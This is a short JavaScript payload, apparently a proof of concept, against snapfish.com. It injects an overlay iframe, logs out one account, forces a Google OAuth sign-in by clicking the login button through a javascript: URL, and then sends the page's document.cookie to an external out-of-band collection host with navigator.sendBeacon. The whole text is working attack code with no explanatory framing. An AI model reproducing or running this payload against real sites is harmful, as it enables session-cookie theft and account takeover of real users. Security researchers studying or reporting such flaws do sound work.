//Logout Attacker's Account

var profileIframe2 = document.createElement('iframe');
profileIframe2.setAttribute('src', 'https://www.snapfish.com/logout');
profileIframe2.setAttribute('width', '100%');
profileIframe2.setAttribute('height', '500px');
profileIframe2.setAttribute('style', 'position:absolute;z-index:999;top: 100px;');

document.body.appendChild(profileIframe2);

//Login to Victim's Account using oAuth Login
//profileIframe2.setAttribute('src', 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=527231285582946&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL');
setTimeout(() => {
  profileIframe2.setAttribute('src', "https://www.snapfish.com/loginto");
}, 3000)

setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 6000)

alert("LOGIN GOOGLE");

//Send cookie to Attacker Server
var link="https://dmftkmghscwxjulluncuqmho9x6l6ujkt.oast.fun/VictimCookies="+document.cookie;
navigator.sendBeacon(link,"");

